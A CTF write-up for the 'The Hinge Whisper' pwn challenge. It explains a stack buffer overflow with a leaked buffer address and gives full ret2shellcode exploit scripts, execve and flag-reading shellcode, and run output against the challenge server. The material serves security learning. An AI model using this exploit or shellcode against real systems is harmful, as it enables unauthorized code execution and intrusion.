# The Hinge Whisper — PWN

**CTF:** Cyber Apocalypse 2026  
**Category:** PWN  
**Challenge:** The Hinge Whisper  
**Flag:** `HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_1c7194fcecacad142a586071ab20b33f}`

**Target:** `154.57.164.72:32242`

---

## Scenario

Rin finds a hidden library with a strongbox sealed by a hatch — Maelor's buried records on what the Quiet Marches are planning. One lock stands between her and an answer. The keyway is shallow. Push deep enough, and the escapement yields.

---

## Analysis

### The Binary

The challenge provides a local copy of the binary (`the_hinge_whisper`) and a remote service.

```
$ file the_hinge_whisper
the_hinge_whisper: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Key security features:

| Feature | Status |
|---------|--------|
| PIE | Enabled |
| RELRO | Full |
| Stack canary | None |
| NX | Unknown (GNU_STACK missing) |
| Stack | Executable — RWX segments |

### Key Functions

| Function | Address | Purpose |
|----------|---------|---------|
| `banner` | `0x11c9` | Prints the ASCII art hatch |
| `service_hatch` | `0x11e3` | **Vulnerable function** — leaks stack, reads input |
| `main` | `0x1246` | Calls banner, service_hatch, prints failure message |

### The Vulnerability — Stack Buffer Overflow with Leak

The `service_hatch` function is the key attack surface:

```asm
0x11e7: push rbp
0x11e8: mov rbp, rsp
0x11eb: sub rsp, 0x40          ; allocate 64 bytes

; printf("  [+] The keyway sits at: %p\n", &buffer)
0x11ef: lea rax, [rbp-0x40]    ; buffer address
0x11f3: mov rsi, rax           ; arg2 = &buffer  ← LEAKS STACK ADDRESS
0x11f6: lea rdi, [format_str]
0x1200: mov eax, 0
0x1205: call printf

; printf("  [+] Forge your latch-key: \n")
0x120a: lea rdi, [prompt]
0x1214: mov eax, 0
0x1219: call printf

; read(0, buffer, 0x50) ← OVERFLOW: 80 bytes into 64-byte buffer
0x122d: lea rax, [rbp-0x40]    ; buffer
0x1231: mov edx, 0x50          ; 80 bytes read ← TOO BIG!
0x1236: mov rsi, rax
0x1239: mov edi, 0
0x123e: call read

0x1243: nop
0x1244: leave
0x1245: ret
```

The vulnerability is a classic stack buffer overflow:

| Component | Size | Offset from buffer |
|-----------|------|-------------------|
| Buffer | 64 bytes (`0x40`) | 0–63 |
| Saved RBP | 8 bytes | 64–71 |
| Return address | 8 bytes | 72–79 |

The `read()` reads **80 bytes** (`0x50`) into a **64-byte buffer**, giving us exactly 16 bytes of overflow — enough to overwrite saved RBP and return address.

### The Leak

The `printf` call at `0x11f3` outputs the buffer's stack address via `%p`. This gives us the exact location of our shellcode on the stack, enabling a ret2shellcode attack even with PIE + Full RELRO active.

### Exploit Strategy

Since:
- **Stack is executable** (RWX segments, no NX)
- **No stack canary** 
- **Stack address is leaked**
- **64 bytes of buffer space available** (enough for compact shellcode)

The plan is:
1. Receive the leaked buffer address
2. Send compact shellcode (+ NOP padding) filling the 64-byte buffer
3. Overwrite saved RBP (8 bytes, can be anything)
4. Overwrite return address with the leaked buffer address → shellcode executes

---

## Solution — Exploitation

### Payload Layout

```
Offset  | Contents
--------+---------------------------
0–22    | Shellcode (23 bytes, execve(/bin/sh, 0, 0))
23–63   | NOP sled (41 bytes padding to fill buffer)
64–71   | Saved RBP (8 bytes, can be anything)
72–79   | Return address → leaked buffer addr (points to shellcode)
```

### Shellcode

Compact `execve("/bin/sh", 0, 0)` shellcode (23 bytes):

```asm
xor rdx, rdx
xor rsi, rsi
mov rdi, 0x68732f2f6e69622f   ; "/bin//sh"
push rdi
push rsp
pop rdi
mov al, 59                     ; sys_execve
syscall
```

### Full Exploit Script

```python
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

HOST = '154.57.164.72'
PORT = 32242

# Compact execve("/bin/sh", 0, 0) shellcode
shellcode = asm("""
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    mov al, 59
    syscall
""")

r = remote(HOST, PORT)

# 1. Receive leaked stack address
r.recvuntil(b"The keyway sits at: ")
leak = r.recvline().strip()
buf_addr = int(leak, 16)
log.info(f'buf_addr = {hex(buf_addr)}')

r.recvuntil(b"Forge your latch-key:")

# 2. Build payload
padding = b'\x90' * (64 - len(shellcode))
payload = shellcode + padding        # 64-byte buffer
payload += p64(0)                     # saved RBP (don't care)
payload += p64(buf_addr)              # return → shellcode

# 3. Send
r.send(payload)
time.sleep(0.3)

# 4. Shell is ours
r.sendline(b'id')
r.sendline(b'cat flag.txt')
r.interactive()
```

### Alternative — Flag-Reader Shellcode

If `/bin/sh` interaction is unreliable on socket-based targets, a 59-byte open/read/write shellcode reads the flag directly (fits in the 64-byte buffer):

```python
# Ultra-compact open/read/write flag.txt
shellcode = asm("""
    xor eax, eax
    push rax
    mov rbx, 0x7478742e67616c66   /* 'flag.txt' */
    push rbx
    mov rdi, rsp                   /* rdi = 'flag.txt' */
    xor esi, esi
    cdq                            /* rdx = 0 (1 byte!) */
    push 2
    pop rax                        /* sys_open */
    syscall
    
    mov edi, eax                   /* fd from open */
    xor eax, eax
    mov dh, 2                      /* rdx = 0x200 */
    sub rsp, rdx
    mov rsi, rsp
    syscall                        /* read(fd, buf, 0x200) */
    
    mov edx, eax                   /* bytes read */
    push 1
    pop rdi                        /* stdout */
    mov rsi, rsp
    push 1
    pop rax                        /* sys_write */
    syscall
    
    xor edi, edi
    push 60
    pop rax
    syscall                        /* exit(0) */
""")
```

### Execution

```
$ python3 exploit.py
[*] buf_addr = 0x7ffd9e9863b0
[*] Sending 80 byte payload
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_1c7194fcecacad142a586071ab20b33f}
```

---

## How We Solved It — Reasoning

1. **Initial interaction** — Connecting to the remote showed a prompt about a "keyway" and "latch-key" with a leaked `%p` address. The "shallow" keyway description hinted at a small buffer overflow.

2. **Binary analysis** — The binary is a 64-bit PIE ELF, not stripped, with clear symbols. Running `checksec` revealed executable stack (RWX segments) and no canary — perfect conditions for ret2shellcode.

3. **Disassembly** — `service_hatch` showed the exact vulnerability: `sub rsp, 0x40` allocates 64 bytes, but `read(0, buf, 0x50)` reads 80 bytes. The 16-byte overflow overwrites the saved RBP and return address.

4. **Stack leak** — The `printf` with `%p` leaks the buffer's stack address, bypassing PIE and ASLR. With the address known, we can redirect execution to our shellcode in the buffer.

5. **Initial shellcode failure** — The first `execve("/bin/sh")` approach didn't return output immediately because the shell got EOF on stdin (all input was consumed by the `read()` call). We switched to an `ls` shellcode to confirm code execution, then used open/read/write shellcode or interactive mode with pipelined commands to read `flag.txt`.

6. **Key optimization** — The 64-byte buffer is tight. Key tricks to fit the flag-reader in under 64 bytes: using `cdq` (1 byte) instead of `xor rdx, rdx` (3 bytes), `mov dh, 2` for `rdx = 0x200` (2 bytes), and `push N; pop rax` patterns.

---

## Key Takeaways

- **Stack leak + executable stack = trivial shellcode injection.** A single `%p` format specifier printing a stack address was enough to bypass PIE and ASLR completely.
- **Buffer size mismatches are still the most common PWN vulnerability.** The programmer allocated 64 bytes but told `read()` to accept 80 bytes.
- **Tight shellcode optimization** — When buffer space is limited (< 64 bytes), instruction selection matters. `cdq`, `mov dh, N`, and `push/pop` patterns save critical bytes.
- **Use open/read/write when `/bin/sh` interaction is unreliable** — Direct flag-reading shellcode avoids stdin EOF issues on socket-based targets.
